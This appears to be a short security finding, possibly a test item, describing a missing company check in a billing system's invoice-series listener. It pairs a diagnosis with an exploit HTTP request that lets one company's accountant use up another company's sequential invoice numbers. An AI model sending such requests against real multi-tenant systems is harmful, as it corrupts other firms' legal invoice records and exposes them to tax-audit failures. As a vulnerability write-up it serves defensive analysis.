diagnosis: The increment_invoice_series event listener increments FiscalSequence.current_number matching obj.custom_series_code without validating FiscalSequence.company_id == obj.company_id. An accountant from one company can specify another company's series_code to consume their legal sequential invoice numbers, causing tax audit non-compliance.
exploit_request:
POST /invoices/drafts HTTP/1.1
Host: billing.taxsystem.eu
Authorization: Bearer <unauthorized_accountant_token>
Content-Type: application/json

{"series_code": "SERIES_CORP_B_2026", "client_name": "Dummy Corp", "amount_cents": 10000}
